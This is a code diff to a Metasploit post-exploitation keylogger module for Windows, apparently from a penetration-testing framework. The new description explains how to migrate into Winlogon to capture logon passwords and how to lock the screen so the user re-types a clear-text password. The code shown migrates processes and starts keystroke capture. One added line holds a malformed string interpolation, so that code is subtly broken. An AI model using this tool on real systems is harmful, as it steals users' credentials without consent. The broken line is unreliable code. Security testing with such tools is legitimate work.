@@ -22,7 +22,16 @@ class Metasploit3 < Msf::Post
 	def initialize(info={})
 		super( update_info( info,
 				'Name'           => 'Microsoft Windows Keystroke Recorder',
-				'Description'    => %q{ Records keystroke logs to a file.},
+				'Description'    => %q{
+					This module can be used to capture keystrokes. To capture keystrokes when the session is running
+					as SYSTEM, the MIGRATE option must be enabled and the CAPTURE_TYPE option should be set to one of
+					Explorer, Winlogon, or a specific PID. To capture the keystrokes of the interactive user, the
+					Explorer option should be used with MIGRATE enabled. Keep in mind that this will demote this session
+					to the user's privileges, so it makes sense to create a separate session for this task. The Winlogon
+					option will capture the username and password entered into the logon and unlock dialog. The LOCKSCREEN
+					option can be combined with the Winlogon CAPTURE_TYPE to for the user to enter their clear-text
+					password.
+						},
 				'License'        => MSF_LICENSE,
 				'Author'         => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
 				'Version'        => '$Revision$',
@@ -116,9 +125,9 @@ class Metasploit3 < Msf::Post
 		mypid = session.sys.process.getpid
 		session.sys.process.get_processes().each do |x|
 			if (process2mig.index(x['name'].downcase) and x['pid'] != mypid)
-				print_status("\t#{process2mig} Process found, migrating into #{x['pid']}")
+				print_status("\t#{process2mig} Process found, migrating into #{x['pid']...}")
 				session.core.migrate(x['pid'].to_i)
-				print_status("Migration Successful!!")
+				print_status("Migration successful!!")
 			end
 		end
 		return true
@@ -126,9 +135,9 @@ class Metasploit3 < Msf::Post
 
 	# Method for migrating in to a PID
 	def pid_migrate(pid)
-		print_status("\tMigrating into #{pid}")
+		print_status("\tMigrating into #{pid}...")
 				session.core.migrate(pid)
-				print_status("Migration Successful!!")
+				print_status("Migration successful!")
 	end
 
 	# Method for starting the keylogger
@@ -140,7 +149,7 @@ class Metasploit3 < Msf::Post
 			session.ui.keyscan_start
 			return true
 		rescue
-			print_status("Failed to start Keylogging!")
+			print_error("Failed to start the keystroke sniffer: #{$!}")
 			return false
 		end
 	end
